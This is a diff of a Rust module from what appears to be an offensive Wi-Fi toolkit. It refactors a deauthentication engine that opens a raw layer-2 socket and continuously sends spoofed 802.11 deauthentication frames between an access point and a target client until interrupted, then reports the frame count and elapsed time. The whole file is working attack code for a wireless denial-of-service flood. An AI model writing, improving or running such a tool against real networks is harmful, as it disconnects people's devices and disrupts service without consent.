@@ -1,24 +1,23 @@
-use std::{thread, time::Duration};
+use std::{thread, time::{Duration, Instant}};
 use std::sync::atomic::{AtomicBool, Ordering};
 use std::sync::Arc;
 use crate::engines::DeauthArgs;
-use crate::addrs::{Mac, Bssid};
 use crate::iface::{Iface, IfaceManager};
-use crate::builders::Frames;
+use crate::builders::DeauthFrame;
 use crate::sockets::Layer2Socket;
-use crate::utils::{ CtrlCHandler, abort };
+use crate::utils::{CtrlCHandler, abort, Mac};
 
 
 
 
 pub struct Deauthentication {
-    builder    : Frames,
+    builder    : DeauthFrame,
     frms_sent  : usize,
     seq_num    : u16,
     socket     : Layer2Socket,
     iface      : Iface,
     channel    : i32,
-    bssid      : Bssid,
+    ap_mac     : Mac,
     target_mac : Mac,
     delay      : u64
 }
@@ -27,16 +26,18 @@ pub struct Deauthentication {
 impl Deauthentication {
 
     pub fn new(args: DeauthArgs) -> Self {
+        let ap_mac = Mac::from_slice(args.bssid.bytes());
+
         Self { 
-            builder    : Frames::new(),
+            builder    : DeauthFrame::new(args.bssid),
             frms_sent  : 0,
             seq_num    : 1,
             socket     : Layer2Socket::new(&args.iface),
             iface      : args.iface,
             channel    : args.channel,
-            bssid      : args.bssid,
             target_mac : args.target_mac,
             delay      : args.delay,
+            ap_mac,
         }
     }
 
@@ -64,9 +65,9 @@ impl Deauthentication {
 
 
     fn display_exec_info(&self) {
-        println!("[!] BSSID...: {}", self.bssid.to_string());
-        println!("[!] TARGET..: {}", self.target_mac.to_string());
-        println!("[!] CHANNEL.: {}", self.channel);
+        println!("\n[*] BSSID...: {}", self.ap_mac.to_string());
+        println!("[*] TARGET..: {}", self.target_mac.to_string());
+        println!("[*] CHANNEL.: {}", self.channel);
     }
 
 
@@ -75,18 +76,18 @@ impl Deauthentication {
         let running = Arc::new(AtomicBool::new(true));
         CtrlCHandler::setup(running.clone());
         
+        let init = Instant::now();
         println!("\n[+] Sending frames. Press CTRL + C to stop");
 
         while running.load(Ordering::SeqCst) {
-            let target = *self.target_mac.bytes();
-            let bssid  = *self.bssid.bytes();
-        
-            self.send_frame(&target, &bssid);
-            self.send_frame(&bssid, &target);
+            self.send_frame(self.target_mac, self.ap_mac);
+            self.send_frame(self.ap_mac, self.target_mac);
         }
+
+        let time = init.elapsed().as_secs_f64();
     
         println!("\n[-] Flood interrupted");
-        println!("[%] Frames sent: {}", self.frms_sent);
+        println!("[%] Frames sent: {} in {:.2}", self.frms_sent, time);
     }
 
 
@@ -94,10 +95,10 @@ impl Deauthentication {
     #[inline]
     fn send_frame(
         &mut self, 
-        src_mac : &[u8; 6], 
-        dst_mac : &[u8; 6], 
+        src_mac : Mac, 
+        dst_mac : Mac, 
     ) {
-        let frame = self.builder.deauth(dst_mac, src_mac, self.bssid, self.seq_num);
+        let frame = self.builder.frame(dst_mac, src_mac, self.seq_num);
         
         self.socket.send(frame);
         self.update_seq_num();
